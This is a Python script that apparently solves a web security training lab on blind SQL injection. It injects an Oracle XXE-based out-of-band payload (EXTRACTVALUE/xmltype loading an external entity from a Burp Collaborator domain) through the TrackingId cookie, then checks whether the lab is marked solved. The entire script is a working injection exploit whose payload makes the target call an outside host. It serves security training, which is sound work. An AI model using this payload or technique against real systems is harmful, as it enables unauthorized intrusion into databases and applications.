from time import sleep
from lib import (
    SESSION,
    check_is_lab_solved,
    generate_parser,
    get_tracking_id,
)
from urllib.parse import quote

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")
    collaborator_domain = args.collaborator_domain

    if not collaborator_domain:
        print("[-] Burp Collaborator Domain Required for solving this exercise")
        exit()

    tracking_id = get_tracking_id(lab_url)

    payload = quote(
        f"""' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{collaborator_domain}/"> %remote;]>'),'/l') FROM dual) --"""
    )

    response = SESSION.get(lab_url, cookies={"TrackingId": f"{tracking_id}{payload}"})

    if response.status_code == 200:
        print(
            "[+] Made the request successfully. Check Burp Collaborator for the results"
        )
        print("[+] Waiting for 5 seconds before checking whether the lab is solved")
        sleep(5)
    else:
        print("[-] Failed to make the request")
        exit()

    check_is_lab_solved(lab_url)
